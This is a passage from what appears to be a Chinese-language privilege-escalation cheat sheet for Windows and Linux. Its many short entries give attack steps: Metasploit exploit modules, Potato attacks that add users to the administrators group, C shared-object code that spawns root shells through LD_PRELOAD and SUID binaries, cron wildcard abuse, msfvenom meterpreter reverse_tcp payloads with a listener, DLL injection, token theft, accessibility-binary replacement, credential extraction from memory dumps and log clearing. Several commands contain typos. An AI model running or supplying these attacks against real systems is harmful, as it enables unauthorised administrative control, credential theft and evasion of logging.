href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p><h3 id="ms14-058"><a href="#ms14-058" class="headerlink" title="ms14_058"></a>ms14_058</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ul><li><code>msf &gt; use exploit/windows/local/ms14_058_track_popup_menu</code></li><li><code>msf exploit(ms14_058_track_popup_menu) &gt; set TARGET &lt; target-id &gt;</code></li><li><code>msf exploit(ms14_058_track_popup_menu) &gt; exploit</code></li></ul><h3 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ol><li>命令提示符下: <code>powershell.exe -nop -ep bypass</code></li><li>在Power Shell提示符类型输入: <code>Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1</code></li><li>在Power Shell提示符类型输入: <code>Invoke-Tater -Trigger 1 -Command “net localgroup administrators user /add”</code></li><li>要确认攻击是否成功，请在 Power Shell 提示符中键入: <code>net localgroup administrators</code></li></ol><p>批注：<a href="https://github.com/Kevin-Robertson/Tater">https://github.com/Kevin-Robertson/Tater</a></p><h3 id="Intel-SYSRET"><a href="#Intel-SYSRET" class="headerlink" title="Intel SYSRET"></a>Intel SYSRET</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ol><li><code>execute -H -f sysret.exe -a &quot;-pid [pid]&quot;</code></li></ol><p>批注：<a href="https://github.com/jajp777/sysret">https://github.com/jajp777/sysret</a></p><p>release版本：<a href="https://github.com/jajp777/sysret/tree/master/x64/Release">https://github.com/jajp777/sysret/tree/master/x64/Release</a></p><h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;outflanknl&#x2F;PrintNightmare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><code>PrintNightmare 10.10.10.10 exp.dll</code></li></ol><h3 id="Folina"><a href="#Folina" class="headerlink" title="Folina"></a>Folina</h3><p>域名: Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;JohnHammond&#x2F;msdt-follina<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><code>python3 follina.py -c &quot;notepad&quot;</code></li></ol><h3 id="ALPC"><a href="#ALPC" class="headerlink" title="ALPC"></a>ALPC</h3><p>域名: Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;riparino&#x2F;Task_Scheduler_ALPC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="RemotePotato0"><a href="#RemotePotato0" class="headerlink" title="RemotePotato0"></a>RemotePotato0</h3><p>域名: Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ol><li><code>sudo ntlmrelayx.py -t ldap://10.0.0.10 –no-wcf-server –escalate-user normal_user</code></li><li><code>.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1</code></li></ol><p>批注：</p><p>ntlmrelayx.py只找到个很相似的：<a href="https://github.com/LuemmelSec/ntlmrelayx.py_to_exe">https://github.com/LuemmelSec/ntlmrelayx.py_to_exe</a></p><p>remotepotato：<a href="https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2">https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2</a></p><h3 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h3><p>域名: Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ol><li><code>certipy req ‘lab.local/cve$:CVEPassword1234*@10.100.10.13’ -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA</code></li><li><code>Rubeus.exe asktgt /user:&quot;目标_sam名称&quot; /certificate:cert.pfx /password:&quot;CERTIFICATE_PASSWORD&quot; /domain:&quot;FQDN_域名&quot; /dc:&quot;域名_CONTROLLER&quot; /show</code></li></ol><p>批注：</p><p>rubeus：<a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>域名: Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  0&#x2F;1 Exploit</p><p>方法: </p><ol><li><code>python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc</code></li></ol><p>批注：</p><p>无py版本，exe版本：<a href="https://github.com/ianxtianxt/MS14-068">https://github.com/ianxtianxt/MS14-068</a></p><h3 id="Sudo-LD-PRELOAD"><a href="#Sudo-LD-PRELOAD" class="headerlink" title="Sudo LD_PRELOAD"></a>Sudo LD_PRELOAD</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Injection</p><p>方法: </p><p>1. </p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">unsetenv</span><span class="token punctuation">(</span>“LD_PRELOAD”<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span>“<span class="token operator">/</span>bin<span class="token operator">/</span>bash”<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><code>gcc -fPIC -shared -o /tmp/ldreload.so ldreload.c -nostartfiles</code></li><li><code>sudo LD_RELOAD=tmp/ldreload.so apache2</code></li></ol><h3 id="Abusing-File-Permission-via-SUID-Binaries-–-so-injection"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-so-injection" class="headerlink" title="Abusing File Permission via SUID Binaries – .so injection)"></a>Abusing File Permission via SUID Binaries – .so injection)</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Injection</p><p>方法: </p><ol><li><code>mkdir /home/user/.config</code></li><li></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> _attribute <span class="token function">_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">system</span><span class="token punctuation">(</span>“cp <span class="token operator">/</span>bin<span class="token operator">/</span>bash <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">&amp;&amp;</span> chmod <span class="token operator">+</span>s <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">&amp;&amp;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">-</span>p”<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><code>gcc -shared -o /home/user/.config/libcalc.so -fPIC/home/user/.config/libcalc.c</code></li><li><code>/usr/local/bin/suid-so</code></li></ol><p>​<code>id</code></p><h3 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Injection</p><p>方法: </p><ol><li><code>RemoteDLLInjector64</code></li></ol><p>​Or</p><p>​<code>MemJect</code></p><p>​Or</p><p>​<code>https://github.com/tomcarver16/BOF-DLL-Inject</code></p><ol><li><code>#define PROCESS_NAME &quot;csgo.exe&quot;</code></li></ol><p>​Or</p><p>​<code>RemoteDLLInjector64.exe pid C:\runforpriv.dll</code></p><p>​Or</p><p>​<code>mandllinjection ./runforpriv.dll pid</code></p><p>批注：</p><p>remoteDllInjector：<a href="https://github.com/Al1ex/RemoteDLLInjector">https://github.com/Al1ex/RemoteDLLInjector</a></p><p>memject：<a href="https://github.com/danielkrupinski/MemJect">https://github.com/danielkrupinski/MemJect</a></p><h3 id="Early-Bird-Injection"><a href="#Early-Bird-Injection" class="headerlink" title="Early Bird Injection"></a>Early Bird Injection</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Injection</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">hollow svchost.exe pop.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：hollow链接<a href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing</a></p><h3 id="Process-Injection-through-Memory-Section"><a href="#Process-Injection-through-Memory-Section" class="headerlink" title="Process Injection through Memory Section"></a>Process Injection through Memory Section</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Injection</p><p>方法: </p><ol><li><code>sec-shinject PID /path/to/bin</code></li></ol><p>批注：未找到</p><h3 id="Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite"><a href="#Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite" class="headerlink" title="Abusing Scheduled Tasks via Cron Path Overwrite"></a>Abusing Scheduled Tasks via Cron Path Overwrite</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Abusing Scheduled Tasks</p><p>方法: </p><ol><li><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; systemupdate.sh;</code></li><li><code>chmod +x systemupdate.sh</code></li><li><code>等待一会儿</code></li><li><code>/tmp/bash -p</code></li><li><code>id &amp;&amp; whoami</code></li></ol><h3 id="Abusing-Scheduled-Tasks-via-Cron-Wildcards"><a href="#Abusing-Scheduled-Tasks-via-Cron-Wildcards" class="headerlink" title="Abusing Scheduled Tasks via Cron Wildcards"></a>Abusing Scheduled Tasks via Cron Wildcards</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Abusing Scheduled Tasks</p><p>方法: </p><ol><li><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; /home/user/systemupdate.sh;</code></li><li><code>touch /home/user/ –checkpoint=1;</code></li><li><code>touch /home/user/ –checkpoint-action=exec=sh\systemupdate.sh</code></li><li><code>等待一会儿</code></li><li><code>/tmp/bash -p</code></li><li><code>id &amp;&amp; whoami</code></li></ol><h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Symlink"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Symlink" class="headerlink" title="Abusing File Permission via SUID Binaries – Symlink)"></a>Abusing File Permission via SUID Binaries – Symlink)</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Abusing File Permission</p><p>方法: </p><ol><li><code>su – www-data;</code></li><li><code>nginxed-root.sh /var/log/nginx/error.log;</code></li><li>In root user</li><li><code>invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1</code></li></ol><h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-1"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-1" class="headerlink" title="Abusing File Permission via SUID Binaries – Environment Variables #1)"></a>Abusing File Permission via SUID Binaries – Environment Variables #1)</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Abusing File Permission</p><p>方法: </p><ol><li><code>echo &#39;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#39; &gt;/tmp/service.c;</code></li><li><code>gcc /tmp/services.c -o /tmp/service;</code></li><li><code>export PATH=/tmp:$PATH;</code></li><li><code>/usr/local/bin/sudi-env; id</code></li></ol><h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-2"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-2" class="headerlink" title="Abusing File Permission via SUID Binaries – Environment Variables #2)"></a>Abusing File Permission via SUID Binaries – Environment Variables #2)</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Abusing File Permission</p><p>方法: </p><ol><li><code>env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp &amp;&amp; chown root.root /tmp/bash &amp;&amp; chmod +S /tmp/bash)&#39; /bin/sh -c /usr/local/bin/suid-env2; set +x; /tmp/bash -p</code></li></ol><h3 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li><code>Windows_dll.c: cmd.exe /k net localgroup administrators user /add</code></li><li><code>x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll</code></li><li><code>sc stop dllsvc &amp; sc start dllsvc</code></li></ol><h3 id="Abusing-Services-via-binPath"><a href="#Abusing-Services-via-binPath" class="headerlink" title="Abusing Services via binPath"></a>Abusing Services via binPath</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li><code>sc config daclsvc binpath= &quot;net localgroup administrators user /add&quot;</code></li><li><code>sc start daclsvc</code></li></ol><h3 id="Abusing-Services-via-Unquoted-Path"><a href="#Abusing-Services-via-Unquoted-Path" class="headerlink" title="Abusing Services via Unquoted Path"></a>Abusing Services via Unquoted Path</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li><code>msfvenom -p windows/exec CMD=’net localgroup administrators user /add’ -f exe-service -o common.exe</code></li><li><code>common.exe 放在 &#39;C:\Program Files\Unquoted Path Service&#39;.</code></li><li><code>sc start unquotedsvc</code></li></ol><h3 id="Abusing-Services-via-Registry"><a href="#Abusing-Services-via-Registry" class="headerlink" title="Abusing Services via Registry"></a>Abusing Services via Registry</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li><code>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t</code></li><li><code>REG_EXPAND_SZ /d c:\temp\x.exe /f</code></li><li><code>sc start regsvc</code></li></ol><h3 id="Abusing-Services-via-Executable-File"><a href="#Abusing-Services-via-Executable-File" class="headerlink" title="Abusing Services via Executable File"></a>Abusing Services via Executable File</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li><code>copy /y c:\Temp\x.exe &quot;c:\Program Files\File Permissions Service\filepermservice.exe&quot;</code></li><li><code>sc start filepermsvc</code></li></ol><h3 id="Abusing-Services-via-Autorun"><a href="#Abusing-Services-via-Autorun" class="headerlink" title="Abusing Services via Autorun"></a>Abusing Services via Autorun</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><p>In Metasploit (msf &gt; prompt) 类型： <code>use multi/handler</code></p><p>In Metasploit (msf &gt; prompt) 类型： <code>set payload windows/meterpreter/reverse_tcp</code></p><p>In Metasploit (msf &gt; prompt) 类型： <code>set lhost [Kali VM IP Address]</code></p><p>In Metasploit (msf &gt; prompt) 类型： <code>run</code></p><p>打开另一个命令提示符并键入:</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;[Kali VM IP Address] -f exe -o program.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">program.exe 放在 &#39;C:\Program Files\Autorun Program&#39;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Abusing-Services-via-AlwaysInstallElevated"><a href="#Abusing-Services-via-AlwaysInstallElevated" class="headerlink" title="Abusing Services via AlwaysInstallElevated"></a>Abusing Services via AlwaysInstallElevated</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;exec CMD&#x3D;&#39;net localgroup administrators user &#x2F;add&#39; -f msi-nouac -o setup.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\Temp\setup.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Or</p><pre class="line-numbers language-none"><code class="language-none">SharpUp.exe AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：sharpup链接<a href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p><h3 id="Abusing-Services-via-SeCreateToken"><a href="#Abusing-Services-via-SeCreateToken" class="headerlink" title="Abusing Services via SeCreateToken"></a>Abusing Services via SeCreateToken</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">!rmpriv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Abusing-Services-via-SeDebug"><a href="#Abusing-Services-via-SeDebug" class="headerlink" title="Abusing Services via SeDebug"></a>Abusing Services via SeDebug</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">Conjure-LSASS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Or</p><pre class="line-numbers language-none"><code class="language-none">syscall_enable_priv 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Remote-Process-via-Syscalls-HellsGate-Hal操作系统Gate"><a href="#Remote-Process-via-Syscalls-HellsGate-Hal操作系统Gate" class="headerlink" title="Remote Process via Syscalls (HellsGate|Hal操作系统Gate)"></a>Remote Process via Syscalls (HellsGate|Hal操作系统Gate)</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">injectEtwBypass pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/boku7/injectEtwBypass">https://github.com/boku7/injectEtwBypass</a></p><h3 id="Escalate-With-DuplicateTokenEx"><a href="#Escalate-With-DuplicateTokenEx" class="headerlink" title="Escalate With DuplicateTokenEx"></a>Escalate With DuplicateTokenEx</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型: Abuse Privilege</p><p>方法: </p><pre class="line-numbers language-none"><code class="language-none">PrimaryTokenTheft.exe pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Or</p><pre class="line-numbers language-none"><code class="language-none">TokenPlaye.exe –impersonate –pid pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：</p><p>primarytokenthenft：<a href="https://github.com/slyd0g/PrimaryTokenTheft">https://github.com/slyd0g/PrimaryTokenTheft</a></p><p>tokenplaye：<a href="https://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8">https://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8</a></p><h3 id="Abusing-Services-via-SeIncreaseBasePriority"><a href="#Abusing-Services-via-SeIncreaseBasePriority" class="headerlink" title="Abusing Services via SeIncreaseBasePriority"></a>Abusing Services via SeIncreaseBasePriority</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">start &#x2F;realtime SomeCpuIntensiveApp.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：</p><p>找了一圈，只有这儿有相关内容：<a href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></p><h3 id="Abusing-Services-via-SeManageVolume"><a href="#Abusing-Services-via-SeManageVolume" class="headerlink" title="Abusing Services via SeManageVolume"></a>Abusing Services via SeManageVolume</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">只需编译并运行SeManageVolumeAbuse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/xct/SeManageVolumeAbuse">https://github.com/xct/SeManageVolumeAbuse</a></p><h3 id="Abusing-Services-via-SeRelabel"><a href="#Abusing-Services-via-SeRelabel" class="headerlink" title="Abusing Services via SeRelabel"></a>Abusing Services via SeRelabel</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">WRITE_OWNER对资源的访问权限，包括文件和文件夹。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">Run for privilege escalation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Abusing-Services-via-SeRestore"><a href="#Abusing-Services-via-SeRestore" class="headerlink" title="Abusing Services via SeRestore"></a>Abusing Services via SeRestore</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li><code>启动具有 SeRestore 权限的 PowerShell/ISE</code>.</li><li><code>使用Enable-SeRestorePrivilege 启用权限</code>.</li><li><code>将utilman.exe重命名为utilman.old</code></li><li><code>将cmd.exe重命名为utilman.exe</code></li><li><code>锁定控制台并按Win+U</code></li></ol><h3 id="Abuse-via-SeBackup"><a href="#Abuse-via-SeBackup" class="headerlink" title="Abuse via SeBackup"></a>Abuse via SeBackup</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><p>In Metasploit (msf &gt; prompt) 输入: <code>use auxiliary/server/capture/http_basic</code></p><p>In Metasploit (msf &gt; prompt) 输入: <code>set uripath x</code></p><p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">在taskmgr中，右键单击“Image Name”栏中的“iexplore.exe”并从弹出菜单中选择“创建转储文件”.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">strings &#x2F;root&#x2F;Desktop&#x2F;iexplore.DMP | grep &quot;Authorization: Basic&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择复制 Base64 编码字符串</p><p>在命令提示符下键入： <code>echo -ne [Base64 String] | Base64-d</code></p><h3 id="Abusing-via-SeCreatePagefile"><a href="#Abusing-via-SeCreatePagefile" class="headerlink" title="Abusing via SeCreatePagefile"></a>Abusing via SeCreatePagefile</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">HIBR2BIN &#x2F;PLATFORM X64 &#x2F;MAJOR 6 &#x2F;MINOR 1 &#x2F;INPUT hiberfil.sys &#x2F;OUTPUT uncompressed.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/MagnetForensics/Hibr2Bin">https://github.com/MagnetForensics/Hibr2Bin</a></p><h3 id="Abusing-via-SeSystemEnvironment"><a href="#Abusing-via-SeSystemEnvironment" class="headerlink" title="Abusing via SeSystemEnvironment"></a>Abusing via SeSystemEnvironment</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><p>.<code>load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</code></p><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">TrustExec.exe -m exec -c &quot;whoami &#x2F;priv&quot; -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：两个工具都没找到QAQ</p><h3 id="Abusing-via-SeTakeOwnership"><a href="#Abusing-via-SeTakeOwnership" class="headerlink" title="Abusing via SeTakeOwnership"></a>Abusing via SeTakeOwnership</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li><code>takeown.exe /f &quot;%windir%\system32&quot;</code></li><li><code>icalcs.exe &quot;%windir%\system32&quot; /grant &quot;%username%&quot;:F</code></li><li>将cmd.exe重命名为utilman.exe</li><li>锁定控制台并按Win+U</li></ol><h3 id="Abusing-via-SeTcb"><a href="#Abusing-via-SeTcb" class="headerlink" title="Abusing via SeTcb"></a>Abusing via SeTcb</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><p>​<code>PSBits</code></p><p>​Or</p><p>​<code>PrivFu</code></p><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">psexec.exe -i -s -d cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Abusing-via-SeTrustedCredManAccess"><a href="#Abusing-via-SeTrustedCredManAccess" class="headerlink" title="Abusing via SeTrustedCredManAccess"></a>Abusing via SeTrustedCredManAccess</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><p>​<code>.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</code></p><p>​Or</p><p>​<code>CredManBOF</code></p><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">TrustExec.exe -m exec -c &quot;whoami &#x2F;priv&quot; -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Abusing-tokens-via-SeAssignPrimaryToken"><a href="#Abusing-tokens-via-SeAssignPrimaryToken" class="headerlink" title="Abusing tokens via SeAssignPrimaryToken"></a>Abusing tokens via SeAssignPrimaryToken</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><p>​<code>JuicyPotato.exe</code></p><p>​Or</p><p>​<code>https://github.com/decoder-it/juicy_2</code></p><p>​<code>https://github.com/antonioCoco/RoguePotato</code></p><h3 id="Abusing-via-SeCreatePagefile-1"><a href="#Abusing-via-SeCreatePagefile-1" class="headerlink" title="Abusing via SeCreatePagefile"></a>Abusing via SeCreatePagefile</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Privilege</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​Or</p><pre class="line-numbers language-none"><code class="language-none">invoke-module LogCleaner.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：wela链接<a 